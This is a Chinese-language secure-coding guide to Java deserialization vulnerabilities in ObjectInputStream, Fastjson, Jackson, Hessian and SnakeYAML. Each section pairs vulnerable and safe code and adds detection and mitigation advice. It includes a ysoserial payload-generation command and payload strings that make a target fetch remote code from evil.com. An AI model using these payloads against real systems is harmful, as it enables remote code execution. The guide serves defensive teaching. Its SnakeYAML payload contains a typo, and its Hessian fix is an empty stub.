---
id: DESERIALIZATION
name: 反序列化漏洞
severity: critical
owasp: "A08:2025"
cwe: ["CWE-502"]
category: deserialization
frameworks: [ObjectInputStream, Fastjson, Jackson, Hessian, XStream, SnakeYAML]
last_updated: "2026-04-17"
doc_version: "1.0"
---

# 反序列化漏洞

> 最后更新：2026-04-17

## 概述

反序列化漏洞是指应用程序在反序列化不可信数据时，攻击者可以通过构造恶意序列化数据，触发任意代码执行或拒绝服务攻击。

## 风险等级

| 维度 | 评级 |
|------|------|
| OWASP Top 10 | A08:2025 - Software or Data Integrity Failures |
| CWE | CWE-502 |
| 严重程度 | 高危/严重 |

## 攻击类型

| 库/组件 | 漏洞入口 | 攻击方式 | 影响 |
|---------|---------|---------|------|
| Java 原生 | ObjectInputStream | ysoserial gadget chain | RCE |
| Fastjson | JSON.parseObject | AutoType 触发恶意类 | RCE |
| Jackson | ObjectMapper.readValue | enableDefaultTyping | RCE |
| Hessian | HessianInput.readObject | gadget chain | RCE |
| XStream | XStream.fromXML | 任意对象实例化 | RCE |
| SnakeYAML | Yaml.load | 任意类实例化 | RCE |
| Kryo | Kryo.readClassAndObject | 任意类实例化 | RCE |
| json-io | JsonReader.jsonToJava | 任意类实例化 | RCE |

## Java 场景

### 1. Java 原生反序列化

```java
// 漏洞代码
public Object deserialize(byte[] data) throws Exception {
    ByteArrayInputStream bis = new ByteArrayInputStream(data);
    ObjectInputStream ois = new ObjectInputStream(bis);
    return ois.readObject(); // 危险！
}
```

**攻击方式**：
```bash
# 使用 ysoserial 生成恶意 payload
java -jar ysoserial.jar CommonsCollections1 'touch /tmp/pwned' > payload.ser
```

**安全代码**：
```java
public Object deserialize(byte[] data) throws Exception {
    ByteArrayInputStream bis = new ByteArrayInputStream(data);
    ObjectInputStream ois = new ObjectInputStream(bis) {
        private static final Set<String> ALLOWED_CLASSES =
            Set.of("com.example.User", "com.example.Order");

        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {
            if (!ALLOWED_CLASSES.contains(desc.getName())) {
                throw new InvalidClassException(
                    "Unauthorized deserialization attempt", desc.getName());
            }
            return super.resolveClass(desc);
        }
    };
    return ois.readObject();
}
```

### 2. Fastjson 反序列化

```java
// 漏洞代码：开启 AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
User user = JSON.parseObject(jsonStr, User.class);

// 攻击 payload
String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                 "\"dataSourceName\":\"ldap://evil.com/Exploit\"," +
                 "\"autoCommit\":true}";
```

**安全代码**：
```java
// 关闭 AutoType
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);

// 使用白名单
ParserConfig config = new ParserConfig();
config.addAccept("com.example.");
User user = JSON.parseObject(jsonStr, User.class, config);
```

**SafeMode（推荐）**：
```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

### 3. Jackson 反序列化

```java
// 漏洞代码：开启默认类型
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // 危险！
Object obj = mapper.readValue(json, Object.class);

// 攻击 payload
String payload = "[\"org.springframework.context.support.ClassPathXmlApplicationContext\"," +
                 "\"http://evil.com/exploit.xml\"]";
```

**安全代码**：
```java
ObjectMapper mapper = new ObjectMapper();
mapper.disableDefaultTyping(); // 禁用

// 或使用类型白名单
PolymorphicTypeValidator ptv = new BasicPolymorphicTypeValidator.Builder()
    .allowIfBaseType("com.example.BaseEntity")
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
```

### 4. Hessian 反序列化

```java
// 漏洞代码
HessianInput hi = new HessianInput(inputStream);
Object obj = hi.readObject(); // 危险！
```

**安全代码**：
```java
// 使用白名单过滤
HessianInput hi = new HessianInput(inputStream) {
    @Override
    public Object readObject() throws IOException {
        // 实现白名单过滤逻辑
    }
};
```

### 5. SnakeYAML 反序列化

```java
// 漏洞代码
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput); // 危险！

// 攻击 payload
String payload = "!!javax.script.ScriptEngineManager [" +
                 "!!java.net.URLClassLoader [[!!java.netURL [\"http://evil.com/\"]]]" +
                 "]";
```

**安全代码**：
```java
// 使用 SafeConstructor
Yaml yaml = new Yaml(new SafeConstructor());
Object obj = yaml.load(userInput);
```

## 检测方法

### 静态检测

```bash
# 搜索危险的序列化调用
grep -rn "ObjectInputStream" src/
grep -rn "readObject" src/
grep -rn "JSON.parseObject" src/
grep -rn "enableDefaultTyping" src/
grep -rn "setAutoTypeSupport" src/
```

### 动态检测

1. **使用 ysoserial 测试**
2. **Burp Suite 插件**
3. ** marshalsec 漏洞扫描**

## 防护措施

### 1. 避免反序列化不可信数据

```java
// 不推荐：直接反序列化用户输入
Object obj = objectMapper.readValue(userInput, Object.class);

// 推荐：使用安全的替代方案
String json = sanitize(userInput);
MyDto dto = objectMapper.readValue(json, MyDto.class);
```

### 2. 使用白名单

```java
// 只允许特定的类被反序列化
Set<String> ALLOWED_CLASSES = Set.of(
    "com.example.User",
    "com.example.Order",
    "java.lang.String"
);
```

### 3. 禁用危险特性

```java
// Fastjson
ParserConfig.getGlobalInstance().setAutoTypeSupport(false);
ParserConfig.getGlobalInstance().setSafeMode(true);

// Jackson
objectMapper.disableDefaultTyping();

// SnakeYAML
Yaml yaml = new Yaml(new SafeConstructor());
```

### 4. 使用安全的序列化格式

```java
// 使用 JSON、Protobuf 等安全的格式替代 Java 原生序列化
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(object);
```

### 5. 升级依赖版本

定期升级依赖版本，关注安全公告：
- Fastjson >= 1.2.83
- Jackson >= 2.15.0
- Log4j2 >= 2.17.1

## 参考资料

- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [Java Deserialization Cheat Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
- [ysoserial](https://github.com/frohoff/ysoserial)
